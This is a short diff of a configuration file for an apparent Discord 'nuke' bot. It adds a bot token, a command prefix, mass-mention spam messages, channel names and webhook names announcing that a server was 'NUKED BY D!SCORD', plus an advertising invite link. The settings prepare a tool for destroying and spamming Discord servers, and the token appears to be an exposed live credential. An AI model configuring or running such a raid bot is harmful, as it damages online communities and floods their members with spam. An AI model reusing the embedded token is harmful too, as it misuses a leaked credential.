@@ -1,11 +1,11 @@
 #BOT CONFIG
-token = ""
-prefix = ""
+token = "MTIzMTUwNDI1ODE0MzM1NDk0Mg.GhD91W.3bHCICU7rKBBDxlTsaz1XxrLI797-1kmg4oCz8"
+prefix = "!"
 
 #NUKE CONFIG
-spam_messages = ["@everyone nuked", "@everyone get nuked"]
-channel_names = ["nuked", "get nuked"]
-webhook_usernames = ["nuked", "get nuked"]
+spam_messages = ["@everyone CRASHED BY D!SCORD discord.gg/nSuYRGkTvZ", "@everyone NUKED BY D!SCORD discord.gg/nSuYRGkTvZ"]
+channel_names = ["NUKED BY D!SCORD", "CRASHED BY D!SCORD"]
+webhook_usernames = ["D!SCORD NUKE", "D!SCORD CRASH"]
 nuke_on_join = False
 nuke_wait_time = 0
 
